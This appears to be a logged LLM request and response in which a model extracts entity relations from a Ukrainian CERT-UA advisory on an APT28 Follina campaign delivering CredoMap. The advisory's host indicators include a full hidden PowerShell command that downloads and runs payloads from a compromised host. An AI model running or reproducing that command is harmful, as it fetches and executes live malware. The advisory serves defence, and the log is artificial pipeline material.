@@ -1,0 +1,141 @@
+=== REQUEST (gemini gemini-3.7-flash) ===
+--- sampling ---
+{"temperature":0}
+--- instructions ---
+### ROLE ###
+You are a high-precision relation extraction engine for cybersecurity incident reports (CERT-UA). The entities of one report have already been extracted and typed. Your only task is to state the relationships between these entities that the report supports.
+
+### ENTITIES OF THIS REPORT ###
+Each line is one entity: its name exactly as extracted, its type in square brackets, and a one-sentence description. The type "untyped" means no type has been established yet; the phrase after it is the extractor's own wording.
+- Nuclear Terrorism A Very Real Threat.rtf [Malicious File] A malicious Rich Text Format document used as a lure to exploit vulnerabilities and deliver malware.
+- CVE-2022-30190 [Vulnerability] A remote code execution vulnerability in the Microsoft Windows Support Diagnostic Tool, commonly known as Follina.
+- CredoMap [Malware Family] A malware family used by threat actors to steal browser credentials and system information.
+- APT28 [Threat Actor] A Russian state-sponsored cyber espionage group associated with the Russian military intelligence agency GRU.
+- article.html [Malware Family] A malicious HTML file containing payload code executed during the exploitation process.
+- SQLite.Interop.dll [Malware Family] A dynamic link library file required for SQLite database operations.
+- docx.exe [Malware Family] An executable file used as the payload delivering CredoMap malware.
+- kitten-268.frge.io [Domain Name] A domain name used to host a malicious HTML payload in a cyberattack campaign.
+- frge.io [Domain Name] A domain hosting service used by threat actors to stage malicious files.
+- kompartpomiar.pl [Domain Name] A compromised website domain used to host secondary malware payloads.
+- 162.241.216.236 [IP Address] An IP address associated with the network infrastructure used in the cyberattack.
+- seo@specialityllc.com [Email Address] An email address identified as an indicator of compromise in a cyber incident.
+
+### KNOWN RELATION TYPES ###
+Each relation type is known ONLY for the pair of argument types it is listed under (head type -> tail type). Types known for other pairs are not shown and do not apply.
+Head [Malicious File] -> Tail [Malicious File]:
+- downloads-and-executes: 
+
+Head [Malicious File] -> Tail [Malware Family]:
+- delivers: 
+
+Head [Malware Family] -> Tail [Vulnerability]:
+- exploits-vulnerability: The head malware family or file leverages the tail software vulnerability to achieve execution or compromise.
+
+Head [Malware Family] -> Tail [Malware Family]:
+- downloads-file: The head malware family or document requests and retrieves the tail file from a network location.
+
+Head [Threat Actor] -> Tail [Malware Family]:
+- uses-malware: 
+
+Head [IP Address] -> Tail [Malicious File]:
+- hosts-file: The head IP address hosts or serves the tail malicious file or payload.
+
+Head [IP Address] -> Tail [Malware Family]:
+- hosts-file: The head IP address hosts or serves the tail malicious file or payload.
+
+### WHAT TO OUTPUT ###
+1. `relations`: relationships STATED OR CLEARLY IMPLIED in the text between two of the entities above, as { "head", "type", "tail", "evidence", "fit" }.
+   - `head` / `tail` MUST exactly match entity names from the list above. Direction: head acts on tail.
+   - `type`: if a known relation type listed under exactly this pair of argument types states the relationship precisely, use its name. Otherwise write a short lower-case verb phrase with hyphens in your own words, as specific as the text allows. Do NOT stretch a known type to a relationship it does not precisely state, and do NOT use a type listed under a different pair of argument types.
+   - `fit`: "exact" when a known type of this pair states the relationship precisely; "loose" when you used a known type of this pair although it only roughly fits; "new" when you wrote your own phrase.
+   - `evidence`: a short verbatim fragment of the text (at most 15 words) supporting the relation.
+   - Do NOT invent relations the text does not support. Few or no relations is a correct answer. Do NOT add a relation for every co-occurring pair.
+2. `newRelationTypes`: [{ "name", "definition" }] — one entry with a one-line definition for EVERY type you wrote yourself (fit "new").
+
+### FINAL OUTPUT FORMAT ###
+First think through the report in free form (who did what to whom, with which tools). Keep this BRIEF and do NOT use curly braces { } anywhere in it. Then output a single raw JSON object: { "relations": [...], "newRelationTypes": [...] }. No markdown code fences, no commentary after the JSON. If nothing is found: { "relations": [], "newRelationTypes": [] }.
+
+Apply these instructions to the report in the user's next message.
+
+--- text ---
+<p><strong>Загальна інформація</strong></p><p>Урядовою командою реагування на комп'ютерні надзвичайні події України CERT-UA виявлено шкідливий документ "Nuclear Terrorism A Very Real Threat.rtf" відкриття якого призведе до завантаження HTML-файлу та виконання JavaScript-коду (CVE-2022-30190), який забезпечить завантаження та запуск шкідливої програми CredoMap.</p><p>Мета-дані свідчать про модифікацію документу 09.06.2022, а отже його розповсюдження могло бути здійснене ще 10.06.2022.</p><p>За сукупністю характерних ознак вважаємо за можливе асоціювати виявлену активність з діяльністю групи APT28.&nbsp;</p><p><br></p><p><strong>Індикатори компрометації</strong></p><p><em>Файли:</em></p><pre class="ql-syntax" spellcheck="false">eafa11070f213f16efc030f625a423d1&nbsp; &nbsp; daaa271cee97853bf4e235b55cb34c1f03ea6f8d3c958f86728d41f418b0bf01&nbsp; &nbsp; Nuclear Terrorism A Very Real Threat.rtf
+ab6c70af19f7d41a443feb8ccb57d264&nbsp; &nbsp; 14ae02c521b85e60b11393ffc0da5e25946c4775a84995800b73398df4bceffb&nbsp; &nbsp; article.html
+56a504a34d2cfbfc7eaa2b68e34af8ad&nbsp; &nbsp; 9309fb2a3f326d0f2cc3f2ab837cfd02e4f8cb6b923b3b2be265591fd38f4961&nbsp; &nbsp; SQLite.Interop.dll (Легітимна DLL)
+d3bddb5de864afd7e4f5e56027f4e5ea&nbsp; &nbsp; 2318ae5d7c23bf186b88abecf892e23ce199381b22c8eb216ad1616ee8877933&nbsp; &nbsp; docx.exe (CredoMap)
+</pre><p><br></p><p><em>Мережеві:</em></p><pre class="ql-syntax" spellcheck="false">hXXp://kitten-268.frge[.]io/article.html
+hXXp://kompartpomiar[.]pl/grafika/SQLite.Interop.dll
+hXXp://kompartpomiar[.]pl/grafika/docx.exe
+162[.]241.216.236
+kitten-268.frge[.]io
+frge[.]io (потребує додаткового моніторингу)
+kompartpomiar[.]pl (вірогідно, скомпрометований веб-ресурс)
+seo@specialityllc[.]com
+</pre><p><br></p><p><em>Хостові:</em></p><pre class="ql-syntax" spellcheck="false">%USERPROFILE%\docx.exe
+%USERPROFILE%\SQLite.Interop.dll
+cmd.exe /k powershell -NonInteractive -WindowStyle Hidden -NoProfile -command '&amp; {iwr http://kompartpomiar.pl/grafika/SQLite.Interop.dll -OutFile "C:\Users\$ENV:UserName\SQLite.Interop.dll";iwr http://kompartpomiar.pl/grafika/docx.exe -OutFile "C:\Users\$ENV:UserName\docx.exe";Start-Process "C:\Users\$ENV:UserName\docx.exe"}'
+</pre><p><br></p><p><strong>Графічні зображення</strong></p><p></p>
+
+=== RESPONSE (7.8s, in 2131 / out 690 tok, STOP) ===
+The report details an attack attributed to APT28 utilizing a malicious RTF document to exploit CVE-2022-30190 via an HTML/JavaScript payload (article.html) hosted on kitten-268.frge.io, ultimately downloading and executing CredoMap payloads (docx.exe and SQLite.Interop.dll) staged on the compromised domain kompartpomiar.pl.
+
+```json
+{
+  "relations": [
+    {
+      "head": "APT28",
+      "type": "uses-malware",
+      "tail": "CredoMap",
+      "evidence": "асоціювати виявлену активність з діяльністю групи APT28",
+      "fit": "exact"
+    },
+    {
+      "head": "Nuclear Terrorism A Very Real Threat.rtf",
+      "type": "delivers",
+      "tail": "article.html",
+      "evidence": "документ \"Nuclear Terrorism A Very Real Threat.rtf\" відкриття якого призведе до завантаження HTML-файлу",
+      "fit": "exact"
+    },
+    {
+      "head": "Nuclear Terrorism A Very Real Threat.rtf",
+      "type": "delivers",
+      "tail": "CredoMap",
+      "evidence": "відкриття якого призведе... завантаження та запуск шкідливої програми CredoMap",
+      "fit": "exact"
+    },
+    {
+      "head": "article.html",
+      "type": "exploits-vulnerability",
+      "tail": "CVE-2022-30190",
+      "evidence": "HTML-файлу та виконання JavaScript-коду (CVE-2022-30190)",
+      "fit": "exact"
+    },
+    {
+      "head": "kitten-268.frge.io",
+      "type": "hosts-file",
+      "tail": "article.html",
+      "evidence": "hXXp://kitten-268.frge[.]io/article.html",
+      "fit": "new"
+    },
+    {
+      "head": "kompartpomiar.pl",
+      "type": "hosts-file",
+      "tail": "docx.exe",
+      "evidence": "hXXp://kompartpomiar[.]pl/grafika/docx.exe",
+      "fit": "new"
+    },
+    {
+      "head": "kompartpomiar.pl",
+      "type": "hosts-file",
+      "tail": "SQLite.Interop.dll",
+      "evidence": "hXXp://kompartpomiar[.]pl/grafika/SQLite.Interop.dll",
+      "fit": "new"
+    }
+  ],
+  "newRelationTypes": [
+    {
+      "name": "hosts-file",
+      "definition": "The head domain name hosts or serves the tail file or payload."
+    }
+  ]
+}
+```
